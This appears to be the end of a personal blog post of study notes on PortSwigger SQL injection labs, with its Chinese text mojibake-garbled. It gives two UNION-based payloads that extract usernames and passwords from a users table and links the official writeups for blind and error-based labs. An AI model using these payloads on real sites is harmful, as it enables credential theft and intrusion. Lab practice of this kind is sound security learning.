<h1 id="sqlè”åˆæ³¨å…¥3"><a href="#sqlè”åˆæ³¨å…¥3" class="headerlink" title="sqlè”åˆæ³¨å…¥3"></a>sqlè”åˆæ³¨å…¥3</h1><p>åŒä¸Šé¢çš„ç« èŠ‚ã€Špostgresqlæ³¨å…¥2ã€‹</p>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?category=-Pets&#x27; union all select username,password from users--+<br></code></pre></td></tr></table></figure>

<h1 id="sqlè”åˆæ³¨å…¥4"><a href="#sqlè”åˆæ³¨å…¥4" class="headerlink" title="sqlè”åˆæ³¨å…¥4"></a>sqlè”åˆæ³¨å…¥4</h1><p>è¿™ä¸€å…³å’Œä¸Šé¢ä¸€å…³å”¯ä¸€çš„ä¸åŒå°±æ˜¯è¿™ä¸€å…³çš„å›æ˜¾ä½ç½®ä»1 2 éƒ½æ˜¯å˜æˆäº†åªæœ‰2æ˜¯å›æ˜¾ä½ç½®</p>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?category=-Pets&#x27; union all select &#x27;1&#x27;,username||&#x27;:&#x27;||password from users--+<br></code></pre></td></tr></table></figure>

<h1 id="sqlç›²æ³¨"><a href="#sqlç›²æ³¨" class="headerlink" title="sqlç›²æ³¨"></a>sqlç›²æ³¨</h1><p>ç›²æ³¨çš„é¶åœºå…¨éƒ¨è·³è¿‡ï¼Œç›´æ¥å»çœ‹å®˜æ–¹ç»™å‡ºçš„writeupå§</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">é¶åœºBlind SQL injection with conditional responsesçš„wtï¼š<br>https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses<br><br>é¶åœºBlind SQL injection with conditional errorsçš„wtï¼š<br>https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors<br></code></pre></td></tr></table></figure>

<p>åé¢çš„å¾ˆå¤šé¶åœºç•¥ï¼Œéƒ½åœ¨<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/all-labs">https://portswigger.net/web-security/all-labs</a></p>
<h1 id="sqlæŠ¥é”™æ³¨å…¥"><a href="#sqlæŠ¥é”™æ³¨å…¥" class="headerlink" title="sqlæŠ¥é”™æ³¨å…¥"></a>sqlæŠ¥é”™æ³¨å…¥</h1><p>æŠ¥é”™æ³¨å…¥ä¹ŸåŒæ ·è·³è¿‡å§ï¼Œæš‚æ—¶ç”¨ä¸åˆ°</p>
<p>å¦‚æœé‡åˆ°äº†é‚£ä¹ˆbpå®˜æ–¹çš„wtå°±æ˜¯éå¸¸è¯¦ç»†äº†</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">é¶åœºVisible error-based SQL injectionçš„wtï¼š<br>https://portswigger.net/web-security/sql-injection/blind/lab-sql-injection-visible-error-based<br><br>é¶åœºBlind SQL injection with conditional errorsçš„wtï¼š<br>https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors<br></code></pre></td></tr></table></figure>

<h1 id="æœ€å"><a href="#æœ€å" class="headerlink" title="æœ€å"></a>æœ€å</h1><p>è¿™ç¯‡æ–‡ç« ä»…ä»…åªæ˜¯è®°å½•äº†sqlæ³¨å…¥çš„éƒ¨åˆ†ï¼Œå‰©ä¸‹çš„é¶åœºéƒ½å·²ç»åœ¨å…¶ä»–çš„é¶åœºå­¦ä¹ è¿‡ä¾¿ä¸è®°å½•äº†</p>
<p>è¿™ç¯‡æ–‡ç« çš„ä¸»è¦å†…å®¹å°±æ˜¯MySQLä¹‹å¤–çš„æ•°æ®åº“ç±»å‹çš„åŸºæœ¬æ³¨å…¥è¯­å¥ï¼Œç»™æœªæ¥çš„æˆ‘æˆ–ä¸ºæ•°ä¸å¤šçš„è¯»è€…ä¸€ä¸ªå‚è€ƒï¼</p>

      
    </div>
    
  </div>
  
    
<nav id="article-nav">
  
    <a href="/2023/07/28/XXE%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">&lt;</strong>
      <div class="article-nav-title">
        
          XXEæ³¨å…¥å­¦ä¹ ç¬”è®°
        
      </div>
    </a>
  
  
    <a href="/2023/07/05/%E5%90%84%E7%A7%8D%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B1%BB%E5%9E%8Bsql%E6%B3%A8%E5%85%A5/" id="article-nav-older" class="article-nav-link-wrap">
      <div class="article-nav-title">å„ç§æ•°æ®åº“ç±»å‹sqlæ³¨å…¥</div>
      <strong class="article-nav-caption">&gt;</strong>
    </a>
  
</nav>

  
</article>






</div>
      <footer id="footer">
  <div class="outer">
    <div id="footer-info">
      <div class="footer-left">
        &copy; 2023 Vincent
      </div>
        <div class="footer-right">
          <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/preccrep/hexo-theme-jelly" target="_blank">Jelly</a>
        </div>
    </div>
  </div>
</footer>
    </div>
    
  
<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">



<script>
	var yiliaConfig = {
		fancybox: true,
		mathjax: false,
		animate: true,
		isHome: false,
		isPost: true,
		isArchive: false,
		isTag: false,
		isCategory: false,
		open_in_new: false
	}
</script>

<script src="/js/main.js"></script>




  </div>
</body>
</html>